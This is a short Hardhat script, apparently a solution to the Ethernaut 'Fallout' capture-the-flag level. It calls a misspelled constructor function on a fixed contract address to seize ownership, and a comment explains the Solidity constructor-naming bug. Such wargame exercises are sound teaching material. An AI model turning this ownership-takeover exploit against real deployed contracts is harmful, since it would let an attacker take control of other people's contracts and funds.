import { Contract } from "ethers";
import { ethers } from "hardhat";
import { abi } from "../../artifacts/contracts/2.Fallout/Fallout.sol/Fallout.json";
import { displayResult } from "../../utils/displayResult";

const targetAddress = "0x701E96faDeca9eD7C702af9A529070C490f9bFd4";

async function main() {
  const [attacker] = await ethers.getSigners();
  const fallout = new Contract(targetAddress, abi, attacker);
  const pendingTx = await fallout.Fal1out();
  await pendingTx.wait();
  const owner = await fallout.connect(attacker).owner();
  displayResult(owner === attacker.address);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});

/* Explanation :
In solidity 0.6.0 and below, the constructor must be named after the name of 
the contract. Here "Fal1out" is mispelled, thus it is a regular public function,
callable by anyone.
Here the function Fal1out is called, and the owner of the contract is changed to the attacker.
*/
